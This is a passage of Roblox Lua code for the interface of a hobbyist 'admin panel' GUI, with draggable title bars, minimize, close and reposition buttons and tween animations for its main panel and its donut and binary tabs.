			if scanning == false then
				unable["toggle interface visibility button"].Text = "o.o"
				toggleLoop(true)
			end
		end)

		spawn(function()
			if not unable["unlocked"] then return end
			if minimized then return end
			for name, _ in pairs(showOffsets) do
				randomRotations[name] = getRandomRotation()
			end

			local tweens = {}
			for name, _ in pairs(showOffsets) do
				local smallButton = unable[name]
				local targetPosition = originalPositions[name]
				local targetRotation = randomRotations[name]
				local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
				tween.Completed:Connect(function()
					smallButton.Visible = false
				end)
				table.insert(tweens, tween)
			end
			for _, tween in ipairs(tweens) do
				tween.Completed:Wait()
			end
		end)
	end
end)

local function rotateButtons(direction)
	if not canpress2 then return end
	if not unable["top bar"].Visible then return end

	function tweenPositionAndRotation(object, targetPosition, targetRotation, duration)
		local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = unable["tween service"]:Create(object, tweenInfo, {Position = targetPosition, Rotation = targetRotation})
		tween:Play()
		return tween
	end

	canpress2 = false

	local cycle = (direction == "counter") and counterRotationCycle or rotationCycle

	local targetPositions = {}
	for name, targetName in pairs(cycle) do
		targetPositions[name] = originalPositions[targetName] + showOffsets[targetName]
	end

	local tweens = {}
	for name, targetName in pairs(cycle) do
		local button = unable[name]
		local tween = tweenPositionAndRotation(button, targetPositions[name], 0, 0.5)
		table.insert(tweens, tween)
	end

	local newOriginalPositions = {}
	local newShowOffsets = {}
	for name, targetName in pairs(cycle) do
		newOriginalPositions[name] = originalPositions[targetName]
		newShowOffsets[name] = showOffsets[targetName]
	end

	originalPositions = newOriginalPositions
	showOffsets = newShowOffsets

	canpress2 = true

	for _, tween in ipairs(tweens) do
		tween.Completed:Wait()
	end
end

unable["user input service"].InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode == Enum.KeyCode.RightBracket then
			if unable["toggle interface visibility button"].Text == ">.<" then return end
			if canpress == false then return end
			coroutine.wrap(rotateButtons)("clockwise")
		elseif input.KeyCode == Enum.KeyCode.LeftBracket then
			if unable["toggle interface visibility button"].Text == ">.<" then return end
			if canpress == false then return end
			coroutine.wrap(rotateButtons)("counter")
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["top bar"].Size = UDim2.new(0, 401, 0, 26)

unable["top bar"].BackgroundColor3 = unable["default background color"]

unable["top bar"].BorderColor3 = unable["default border color"]
unable["top bar"].BorderSizePixel = 1

unable["top bar"].TextColor3 = unable["default border color"]
unable["top bar"].Font = Enum.Font.RobotoMono
unable["top bar"].TextSize = 15
unable["top bar"].TextScaled = false
unable["top bar"].Text = " [v" .. unable["version"] .. "] unable's stupid admin panel " .. unable["emoticon"]
unable["top bar"].TextXAlignment = Enum.TextXAlignment.Left
unable["top bar"].TextYAlignment = Enum.TextYAlignment.Center

unable["top bar text padding"] = Instance.new("UIPadding")
unable["top bar text padding"].PaddingLeft = UDim.new(0, 0)
unable["top bar text padding"].PaddingRight = UDim.new(0, 0)
unable["top bar text padding"].Parent = unable["top bar"]

unable["top bar"].Parent = unable["screen gui"]
unable["top bar"].ZIndex = 19
unable["top bar"].Visible = false

function centertopbar()
	local screenWidth = game:GetService"Workspace".CurrentCamera.ViewportSize.X
	local screenHeight = game:GetService"Workspace".CurrentCamera.ViewportSize.Y

	local frameWidth = 401
	local frameHeight = 276
	local centerX = (screenWidth - frameWidth) / 2
	local centerY = (screenHeight - frameHeight) / 2 - 61

	unable["top bar"].Position = UDim2.new(0, centerX, 0, centerY)
end

function dragtopbar()
	local frame = unable["top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		unable["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	unable["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

centertopbar()
dragtopbar()

-------------------------------------------------------------------------------------------------------------------------------

unable["donut tab top bar"].Size = UDim2.new(0, 276, 0, 26)

unable["donut tab top bar"].BackgroundColor3 = unable["default background color"]

unable["donut tab top bar"].BorderColor3 = unable["default border color"]
unable["donut tab top bar"].BorderSizePixel = 1

unable["donut tab top bar"].TextColor3 = unable["default border color"]
unable["donut tab top bar"].Font = Enum.Font.RobotoMono
unable["donut tab top bar"].TextSize = 15
unable["donut tab top bar"].TextScaled = false
unable["donut tab top bar"].Text = " donut.lua o.o"
unable["donut tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
unable["donut tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

unable["donut top bar text padding"] = Instance.new("UIPadding")
unable["donut top bar text padding"].PaddingLeft = UDim.new(0, 0)
unable["donut top bar text padding"].PaddingRight = UDim.new(0, 0)
unable["donut top bar text padding"].Parent = unable["donut tab top bar"]

unable["donut tab top bar"].Parent = unable["screen gui"]
unable["donut tab top bar"].ZIndex = 10
unable["donut tab top bar"].Visible = false

function centerdonuttabtopbar()
	local screenWidth = game:GetService"Workspace".CurrentCamera.ViewportSize.X
	local screenHeight = game:GetService"Workspace".CurrentCamera.ViewportSize.Y

	local frameWidth = 276
	local frameHeight = 276
	local centerX = (screenWidth - frameWidth) / 2
	local centerY = (screenHeight - frameHeight) / 2 - 53

	unable["donut tab top bar"].Position = UDim2.new(0, centerX, 0, centerY)
end

function dragdonuttabtopbar()
	local frame = unable["donut tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		unable["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	unable["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

centerdonuttabtopbar()
dragdonuttabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

unable["binary tab top bar"].Size = UDim2.new(0, 246, 0, 26)

unable["binary tab top bar"].BackgroundColor3 = unable["default background color"]

unable["binary tab top bar"].BorderColor3 = unable["default border color"]
unable["binary tab top bar"].BorderSizePixel = 1

unable["binary tab top bar"].TextColor3 = unable["default border color"]
unable["binary tab top bar"].Font = Enum.Font.RobotoMono
unable["binary tab top bar"].TextSize = 15
unable["binary tab top bar"].TextScaled = false
unable["binary tab top bar"].Text = " binary.lua o.o"
unable["binary tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
unable["binary tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

unable["binary top bar text padding"] = Instance.new("UIPadding")
unable["binary top bar text padding"].PaddingLeft = UDim.new(0, 0)
unable["binary top bar text padding"].PaddingRight = UDim.new(0, 0)
unable["binary top bar text padding"].Parent = unable["binary tab top bar"]

unable["binary tab top bar"].Parent = unable["screen gui"]
unable["binary tab top bar"].ZIndex = 13
unable["binary tab top bar"].Visible = false

function centerbinarytabtopbar()
	local screenWidth = game:GetService"Workspace".CurrentCamera.ViewportSize.X
	local screenHeight = game:GetService"Workspace".CurrentCamera.ViewportSize.Y

	local frameWidth = 246
	local frameHeight = 246
	local centerX = (screenWidth - frameWidth) / 2
	local centerY = (screenHeight - frameHeight) / 2 - 53

	unable["binary tab top bar"].Position = UDim2.new(0, centerX, 0, centerY)
end

function dragbinarytabtopbar()
	local frame = unable["binary tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		unable["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	unable["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

centerbinarytabtopbar()
dragbinarytabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

unable["top bar close button"].Size = UDim2.new(0, 18, 0, 18)
unable["top bar close button"].Position = UDim2.new(0, 379, 0, 4.7)

unable["top bar close button"].BackgroundColor3 = unable["default background color"]

unable["top bar close button"].BorderColor3 = unable["default border color"]
unable["top bar close button"].BorderSizePixel = 1

unable["top bar close button"].TextColor3 = unable["default border color"]
unable["top bar close button"].Font = Enum.Font.RobotoMono
unable["top bar close button"].TextSize = 16
unable["top bar close button"].TextScaled = false
unable["top bar close button"].Text = "X"
unable["top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
unable["top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

unable["top bar close button"].Parent = unable["top bar"]
unable["top bar close button"].ZIndex = 20

unable["top bar close button text padding"] = Instance.new("UIPadding")
unable["top bar close button text padding"].PaddingTop = UDim.new(0, -1)
unable["top bar close button text padding"].Parent = unable["top bar close button"]

unable["top bar close button"].MouseButton1Click:Connect(function()
	if not canpress then return end
	playclicksound()

	unable["top bar"].Visible = not unable["top bar"].Visible

	if unable["top bar"].Visible then
		if minimized then return end
		canpress = false
		local tweens = {}
		for name, offset in pairs(showOffsets) do
			local smallButton = unable[name]
			smallButton.Visible = true
			local targetPosition = originalPositions[name] + offset
			local targetRotation = 0
			local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
			table.insert(tweens, tween)
		end
	else
		if minimized then return end
		canpress = false
		for name, _ in pairs(showOffsets) do
			randomRotations[name] = getRandomRotation()
		end

		local tweens = {}
		for name, _ in pairs(showOffsets) do
			local smallButton = unable[name]
			local targetPosition = originalPositions[name]
			local targetRotation = randomRotations[name]
			local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
			tween.Completed:Connect(function()
				smallButton.Visible = false
			end)
			table.insert(tweens, tween)
		end

		for _, tween in ipairs(tweens) do
			tween.Completed:Wait() canpress = true
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
unable["top bar minimize button"].Position = UDim2.new(0, 355, 0, 4.7)

unable["top bar minimize button"].BackgroundColor3 = unable["default background color"]

unable["top bar minimize button"].BorderColor3 = unable["default border color"]
unable["top bar minimize button"].BorderSizePixel = 1

unable["top bar minimize button"].TextColor3 = unable["default border color"]
unable["top bar minimize button"].Font = Enum.Font.RobotoMono
unable["top bar minimize button"].TextSize = 16
unable["top bar minimize button"].TextScaled = false
unable["top bar minimize button"].Visible = false
unable["top bar minimize button"].Text = "-"
unable["top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
unable["top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

unable["top bar minimize button"].Parent = unable["top bar"]
unable["top bar minimize button"].ZIndex = 20

unable["top bar minimize button text padding"] = Instance.new("UIPadding")
unable["top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
unable["top bar minimize button text padding"].Parent = unable["top bar minimize button"]

canminimize = true

function fade(object, targetTransparency, duration)
	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	local tween = unable["tween service"]:Create(object, tweenInfo, {BackgroundTransparency = targetTransparency})
	tween:Play()
	return tween
end

function tweenSizePosition(object, targetSize, targetPosition, duration)
	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	local tween = unable["tween service"]:Create(object, tweenInfo, {Size = targetSize, Position = targetPosition})
	tween:Play()
	return tween
end

unable["top bar minimize button"].MouseButton1Click:Connect(function()
	if not canminimize then return end
	canpress = false
	canpress2 = false
	playclicksound()

	minimized = not minimized
	canminimize = false

	if minimized then
		unable["top bar minimize button"].Text = "+"

		spawn(function()
			for name, _ in pairs(showOffsets) do
				randomRotations[name] = getRandomRotation()
			end

			local tweens = {}
			for name, _ in pairs(showOffsets) do
				local smallButton = unable[name]
				local targetPosition = originalPositions[name]
				local targetRotation = randomRotations[name]
				local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
				tween.Completed:Connect(function()
					smallButton.Visible = false
				end)
				table.insert(tweens, tween)
			end
			for _, tween in ipairs(tweens) do
				tween.Completed:Wait()
			end
		end)

		unable["block main frame"].BackgroundTransparency = 1
		unable["block main frame"].Visible = true
		local fadeTween = fade(unable["block main frame"], 0, 0.2)

		fadeTween.Completed:Wait()

		unable["main frame 1"].Visible = false
		unable["main frame 2"].Visible = false
		unable["main frame 3"].Visible = false
		unable["main frame 4"].Visible = false
		unable["password frame"].Visible = false

		local tween = tweenSizePosition(unable["block main frame"], UDim2.new(0, 401, 0, 0), UDim2.new(0, 0, 1, 1), 0.5)

		tween.Completed:Wait()

		unable["block main frame"].Visible = false
		unable["emoticon"] = ">.<"
		unable["top bar"].Text = " [v" .. unable["version"] .. "] unable's stupid admin panel " .. unable["emoticon"]
	else
		spawn(function()
			local tweens = {}
			for name, offset in pairs(showOffsets) do
				local smallButton = unable[name]
				smallButton.Visible = true
				local targetPosition = originalPositions[name] + offset
				local targetRotation = 0
				local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
				table.insert(tweens, tween)
			end
			for _, tween in ipairs(tweens) do
				tween.Completed:Wait()
			end
		end)

		unable["top bar minimize button"].Text = "-"

		unable["block main frame"].Visible = true
		local tween = tweenSizePosition(unable["block main frame"], UDim2.new(0, 401, 0, 249), UDim2.new(0, 0, 1, 1), 0.5)

		tween.Completed:Wait()

		if unable["unlocked"] == true then
			unable["password frame"].Visible = false
		else
			unable["password frame"].Visible = true
		end
		unable[lastVisibleFrame].Visible = true

		local fadeTween = fade(unable["block main frame"], 1, 0.2)

		fadeTween.Completed:Wait()

		unable["block main frame"].Visible = false
		unable["emoticon"] = "o.o"
		unable["top bar"].Text = " [v" .. unable["version"] .. "] unable's stupid admin panel " .. unable["emoticon"]
	end

	canminimize = true
	canpress2 = true
	canpress = true
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
unable["top bar reposition button"].Position = UDim2.new(0, 355, 0, 4.7)

unable["top bar reposition button"].BackgroundColor3 = unable["default background color"]

unable["top bar reposition button"].BorderColor3 = unable["default border color"]
unable["top bar reposition button"].BorderSizePixel = 1

unable["top bar reposition button"].TextColor3 = unable["default border color"]
unable["top bar reposition button"].Font = Enum.Font.RobotoMono
unable["top bar reposition button"].TextSize = 16
unable["top bar reposition button"].TextScaled = false
unable["top bar reposition button"].Text = "R"
unable["top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
unable["top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

unable["top bar reposition button"].Parent = unable["top bar"]
unable["top bar reposition button"].ZIndex = 21

unable["top bar reposition button text padding"] = Instance.new("UIPadding")
unable["top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
unable["top bar reposition button text padding"].Parent = unable["top bar reposition button"]

unable["top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()

	local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X
	local screenHeight = game:GetService("Workspace").CurrentCamera.ViewportSize.Y

	local frameWidth = 401
	local frameHeight = 276
	local centerX = (screenWidth - frameWidth) / 2
	local centerY = (screenHeight - frameHeight) / 2 - 61

	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	local tween = unable["tween service"]:Create(
		unable["top bar"],
		tweenInfo,
		{Position = UDim2.new(0, centerX, 0, centerY)}
	)

	tween:Play()
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["donut tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
unable["donut tab top bar close button"].Position = UDim2.new(0, 254, 0, 4.7)

unable["donut tab top bar close button"].BackgroundColor3 = unable["default background color"]

unable["donut tab top bar close button"].BorderColor3 = unable["default border color"]
unable["donut tab top bar close button"].BorderSizePixel = 1

unable["donut tab top bar close button"].TextColor3 = unable["default border color"]
unable["donut tab top bar close button"].Font = Enum.Font.RobotoMono
unable["donut tab top bar close button"].TextSize = 16
unable["donut tab top bar close button"].TextScaled = false
unable["donut tab top bar close button"].Text = "X"
unable["donut tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
unable["donut tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

unable["donut tab top bar close button"].Parent = unable["donut tab top bar"]
unable["donut tab top bar close button"].ZIndex = 11

unable["donut tab top bar close button text padding"] = Instance.new("UIPadding")
unable["donut tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
unable["donut tab top bar close button text padding"].Parent = unable["donut tab top bar close button"]

unable["donut tab top bar close button"].MouseButton1Click:Connect(function()
	if donutrunning then
		donutrunning:Disconnect()
		donutrunning = nil
	end
	donuttabopen = false
	donuttabminimized = false
	playclicksound()
	unable["donut tab top bar"].Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["donut tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
unable["donut tab top bar minimize button"].Position = UDim2.new(0, 230, 0, 4.7)

unable["donut tab top bar minimize button"].BackgroundColor3 = unable["default background color"]

unable["donut tab top bar minimize button"].BorderColor3 = unable["default border color"]
unable["donut tab top bar minimize button"].BorderSizePixel = 1

unable["donut tab top bar minimize button"].TextColor3 = unable["default border color"]
unable["donut tab top bar minimize button"].Font = Enum.Font.RobotoMono
unable["donut tab top bar minimize button"].TextSize = 16
unable["donut tab top bar minimize button"].TextScaled = false
unable["donut tab top bar minimize button"].Visible = true
unable["donut tab top bar minimize button"].Text = "-"
unable["donut tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
unable["donut tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

unable["donut tab top bar minimize button"].Parent = unable["donut tab top bar"]
unable["donut tab top bar minimize button"].ZIndex = 11

unable["donut tab top bar minimize button text padding"] = Instance.new("UIPadding")
unable["donut tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
unable["donut tab top bar minimize button text padding"].Parent = unable["donut tab top bar minimize button"]

donuttabminimized = false
donuttabcanminimize = true

unable["donut tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not donuttabcanminimize then return end
	spawn(playclicksound)
	donuttabcanminimize = false

	donuttabminimized = not donuttabminimized

	if donuttabminimized then
		unable["donut tab top bar minimize button"].Text = "+"
		unable["donut tab block main frame"].Visible = true

		local fadeTween = fade(unable["donut tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		unable["donut tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			unable["donut tab block main frame"],
			UDim2.new(0, 276, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		donuttabreallyminimized = true
		unable["donut tab block main frame"].Visible = false
	else
		unable["donut tab top bar minimize button"].Text = "-"
		unable["donut tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			unable["donut tab block main frame"],
			UDim2.new(0, 276, 0, 233),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		unable["donut tab main frame 1"].Visible = true

		local fadeTween = fade(unable["donut tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		donuttabreallyminimized = false
		unable["donut tab block main frame"].Visible = false
	end

	donuttabcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["donut tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
unable["donut tab top bar reposition button"].Position = UDim2.new(0, 206, 0, 4.7)

unable["donut tab top bar reposition button"].BackgroundColor3 = unable["default background color"]

unable["donut tab top bar reposition button"].BorderColor3 = unable["default border color"]
unable["donut tab top bar reposition button"].BorderSizePixel = 1

unable["donut tab top bar reposition button"].TextColor3 = unable["default border color"]
unable["donut tab top bar reposition button"].Font = Enum.Font.RobotoMono
unable["donut tab top bar reposition button"].TextSize = 16
unable["donut tab top bar reposition button"].TextScaled = false
unable["donut tab top bar reposition button"].Text = "R"
unable["donut tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
unable["donut tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

unable["donut tab top bar reposition button"].Parent = unable["donut tab top bar"]
unable["donut tab top bar reposition button"].ZIndex = 11

unable["donut tab top bar reposition button text padding"] = Instance.new("UIPadding")
unable["donut tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
unable["donut tab top bar reposition button text padding"].Parent = unable["donut tab top bar reposition button"]

unable["donut tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()

	local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X
	local screenHeight = game:GetService("Workspace").CurrentCamera.ViewportSize.Y

	local frameWidth = 276
	local frameHeight = 276
	local centerX = (screenWidth - frameWidth) / 2
	local centerY = (screenHeight - frameHeight) / 2 - 53

	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	local tween = unable["tween service"]:Create(
		unable["donut tab top bar"],
		tweenInfo,
		{Position = UDim2.new(0, centerX, 0, centerY)}
	)

	tween:Play()
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["binary tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
unable["binary tab top bar close button"].Position = UDim2.new(0, 224, 0, 4.7)

unable["binary tab top bar close button"].BackgroundColor3 = unable["default background color"]

unable["binary tab top bar close button"].BorderColor3 = unable["default border color"]
unable["binary tab top bar close button"].BorderSizePixel = 1

unable["binary tab top bar close button"].TextColor3 = unable["default border color"]
unable["binary tab top bar close button"].Font = Enum.Font.RobotoMono
unable["binary tab top bar close button"].TextSize = 16
unable["binary tab top bar close button"].TextScaled = false
unable["binary tab top bar close button"].Text = "X"
unable["binary tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
unable["binary tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

unable["binary tab top bar close button"].Parent = unable["binary tab top bar"]
unable["binary tab top bar close button"].ZIndex = 14

unable["binary tab top bar close button text padding"] = Instance.new("UIPadding")
unable["binary tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
unable["binary tab top bar close button text padding"].Parent = unable["binary tab top bar close button"]

unable["binary tab top bar close button"].MouseButton1Click:Connect(function()
	if binaryrunning then
		binaryrunning:Disconnect()
		binaryrunning = nil
	end
	binarytabopen = false
	binarytabminimized = false
	playclicksound()
	unable["binary tab top bar"].Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["binary tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
unable["binary tab top bar minimize button"].Position = UDim2.new(0, 200, 0, 4.7)

unable["binary tab top bar minimize button"].BackgroundColor3 = unable["default background color"]

unable["binary tab top bar minimize button"].BorderColor3 = unable["default border color"]
unable["binary tab top bar minimize button"].BorderSizePixel = 1

unable["binary tab top bar minimize button"].TextColor3 = unable["default border color"]
unable["binary tab top bar minimize button"].Font = Enum.Font.RobotoMono
unable["binary tab top bar minimize button"].TextSize = 16
unable["binary tab top bar minimize button"].TextScaled = false
unable["binary tab top bar minimize button"].Visible = true
unable["binary tab top bar minimize button"].Text = "-"
unable["binary tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
unable["binary tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

unable["binary tab top bar minimize button"].Parent = unable["binary tab top bar"]
unable["binary tab top bar minimize button"].ZIndex = 14

unable["binary tab top bar minimize button text padding"] = Instance.new("UIPadding")
unable["binary tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
unable["binary tab top bar minimize button text padding"].Parent = unable["binary tab top bar minimize button"]

binarytabminimized = false
binarytabcanminimize = true

unable["binary tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not binarytabcanminimize then return end
	spawn(playclicksound)
	binarytabcanminimize = false

	binarytabminimized = not binarytabminimized

	if binarytabminimized then
		unable["binary tab top bar minimize button"].Text = "+"
		unable["binary tab block main frame"].Visible = true

		local fadeTween = fade(unable["binary tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		unable["binary tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			unable["binary tab block main frame"],
			UDim2.new(0, 246, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		binarytabreallyminimized = true
		unable["binary tab block main frame"].Visible = false
	else
		unable["binary tab top bar minimize button"].Text = "-"
		unable["binary tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			unable["binary tab block main frame"],
			UDim2.new(0, 246, 0, 203),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		unable["binary tab main frame 1"].Visible = true

		local fadeTween = fade(unable["binary tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		binarytabreallyminimized = false
		unable["binary tab block main frame"].Visible = false
	end

	binarytabcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["binary tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
unable["binary tab top bar reposition button"].Position = UDim2.new(0, 176, 0, 4.7)

unable["binary tab top bar reposition button"].BackgroundColor3 = unable["default background color"]

unable["binary tab top bar reposition button"].BorderColor3 = unable["default border color"]
unable["binary tab top bar reposition button"].BorderSizePixel = 1

unable["binary tab top bar reposition button"].TextColor3 = unable["default border color"]
unable["binary tab top bar reposition button"].Font = Enum.Font.RobotoMono
unable["binary tab top bar reposition button"].TextSize = 16
unable["binary tab top bar reposition button"].TextScaled = false
unable["binary tab top bar reposition button"].Text = "R"
unable["binary tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
unable["binary tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

unable["binary tab top bar reposition button"].Parent = unable["binary tab top bar"]
unable["binary tab top bar reposition button"].ZIndex = 14

unable["binary tab top bar reposition button text padding"] = Instance.new("UIPadding")
unable["binary tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
unable["binary tab top bar reposition button text padding"].Parent = unable["binary tab top bar reposition button"]

unable["binary tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()

	local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X
	local screenHeight = game:GetService("Workspace").CurrentCamera.ViewportSize.Y

	local frameWidth = 246
	local frameHeight = 246
	local centerX = (screenWidth - frameWidth) / 2
	local centerY = (screenHeight - frameHeight) / 2 - 53

	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	local tween = unable["tween service"]:Create(
		unable["binary tab top bar"],
		tweenInfo,
		{Position = UDim2.new(0, centerX, 0, centerY)}
	)

	tween:Play()
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["main frame 1"].Size = UDim2.new(0, 401, 0, 250)
unable["main frame 1"].Position = UDim2.new(0, 0, 1, 0)

unable["main frame 1"].BackgroundColor3 = unable["default background color"]

unable["main frame 1"].BorderColor3 = unable["default border color"]
unable["main frame 1"].BorderSizePixel = 1

unable["main frame 1"].Parent = unable["top bar"]
unable["main frame 1"].ZIndex = 18

-------------------------------------------------------------------------------------------------------------------------------

unable["main frame 2"].Size = UDim2.new(0, 401, 0, 249)
unable["main frame 2"].Position = UDim2.new(0, 0, 1, 1)

unable["main frame 2"].BackgroundColor3 = unable["default background color"]

unable["main frame 2"].BorderColor3 = unable["default border color"]
unable["main frame 2"].BorderSizePixel = 1

unable["main frame 2"].Parent = unable["top bar"]
unable["main frame 2"].ZIndex = 20
unable["main frame 2"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

unable["main frame 3"].Size = UDim2.new(0, 401, 0, 249)
unable["main frame 3"].Position = UDim2.new(0, 0, 1, 1)

unable["main frame 3"].BackgroundColor3 = unable["default background color"]

unable["main frame 3"].BorderColor3 = unable["default border color"]
unable["main frame 3"].BorderSizePixel = 1

unable["main frame 3"].Parent = unable["top bar"]
unable["main frame 3"].ZIndex = 22
unable["main frame 3"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

unable["main frame 4"].Size = UDim2.new(0, 401, 0, 249)
unable["main frame 4"].Position = UDim2.new(0, 0, 1, 1)

unable["main frame 4"].BackgroundColor3 = unable["default background color"]

unable["main frame 4"].BorderColor3 = unable["default border color"]
unable["main frame 4"].BorderSizePixel = 1

unable["main frame 4"].Parent = unable["top bar"]
